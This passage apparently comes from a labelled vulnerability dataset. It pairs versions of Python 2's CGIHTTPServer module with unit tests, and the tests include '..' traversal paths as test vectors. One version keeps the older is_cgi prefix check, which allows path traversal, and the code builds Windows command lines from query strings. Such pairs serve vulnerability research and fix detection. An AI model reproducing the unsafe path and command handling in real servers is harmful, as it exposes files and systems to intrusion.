            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1
4,923ba361d8f757f0656cfd216525aca4848e02aa,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0
5,923ba361d8f757f0656cfd216525aca4848e02aa,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
